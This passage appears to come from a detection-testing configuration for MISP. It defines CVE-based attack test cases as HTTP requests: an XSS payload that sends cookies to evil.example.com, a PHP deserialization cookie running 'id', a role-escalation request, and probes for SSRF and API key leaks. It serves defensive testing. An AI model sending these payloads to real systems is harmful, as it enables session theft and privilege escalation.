    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # CVE-BASED ATTACKS — Historical MISP vulnerabilities
  # ═══════════════════════════════════════════════════════════════════════════

  # CVE-2020-28043 — SSRF via /servers/getRemoteUser
  # Severity: Medium (CVSS 5.3). Unauthenticated SSRF allows probing
  # internal services by specifying arbitrary URLs.
  - name: cve-2020-28043-ssrf-getremoteuser
    type: ssrf
    http:
      method: GET
      path: /servers/getRemoteUser/1
      headers:
        Accept: application/json
    successIndicators:
      - statusCode: 200
      - statusCode: 302
      - statusCode: 403
    expectedDetections: []

  # CVE-2024-29859 — Sensitive field exposure in API responses
  # Severity: High (CVSS 7.5). API returns sensitive user data
  # (auth keys, passwords) in responses without proper filtering.
  - name: cve-2024-29859-field-exposure
    type: ssrf
    http:
      method: GET
      path: /admin/users/index.json
      headers:
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
    successIndicators:
      - statusCode: 200
      - statusCode: 403
    expectedDetections: []

  # CVE-2022-29529 — Stored XSS via event attribute
  # Severity: Medium (CVSS 5.4). JavaScript injection in attribute values
  # persists and executes when viewed. We test the injection vector.
  - name: cve-2022-29529-stored-xss
    type: ssrf
    http:
      method: POST
      path: /events/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Event": {
            "info": "BOB XSS Test - CVE-2022-29529",
            "distribution": "0",
            "threat_level_id": "3",
            "analysis": "0",
            "Attribute": [
              {
                "type": "text",
                "category": "Other",
                "value": "<script>document.location='http://evil.example.com/steal?c='+document.cookie</script>",
                "to_ids": false,
                "comment": "CVE-2022-29529 XSS payload"
              }
            ]
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # CVE-2022-47928 — Org admin privilege escalation
  # Severity: High (CVSS 8.8). Org admin can escalate to site admin
  # by manipulating user role_id in API calls.
  # Targets a non-existent user (999) to keep the test non-destructive: the
  # malicious payload still hits the vulnerable endpoint (so detection rules
  # have a chance to fire) but cannot accidentally promote a real user.
  - name: cve-2022-47928-role-escalation
    type: ssrf
    http:
      method: POST
      path: /admin/users/edit/999
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "User": {
            "role_id": "1",
            "change_pw": "0"
          }
        }
    successIndicators:
      - statusCode: 200
      - statusCode: 403
      - statusCode: 404
    expectedDetections: []

  # CVE-2023-37307 — API key leak in error messages
  # Severity: Medium (CVSS 5.3). Error responses include auth key
  # in debug output under certain conditions.
  - name: cve-2023-37307-error-leak
    type: ssrf
    http:
      method: GET
      path: /events/view/999999999
      headers:
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
    successIndicators:
      - statusCode: 200
      - statusCode: 404
    expectedDetections: []

  # T1190 — PHP deserialization probe via cookie
  # CakePHP (MISP's framework) historically vulnerable to deserialization
  # attacks via session cookies or form data.
  - name: php-deserialization-probe
    type: ssrf
    http:
      method: GET
      path: /users/login
      headers:
        Cookie: "MISP_session=O%3A15%3A%22ObjectInjection%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D"
        Accept: text/html
    successIndicators:
      - statusCode: 200
      - statusCode: 302
    expectedDetections: []

  # T1190 — SSRF via attribute enrichment (fetches external URL)
  - name: api-attribute-enrichment-ssrf
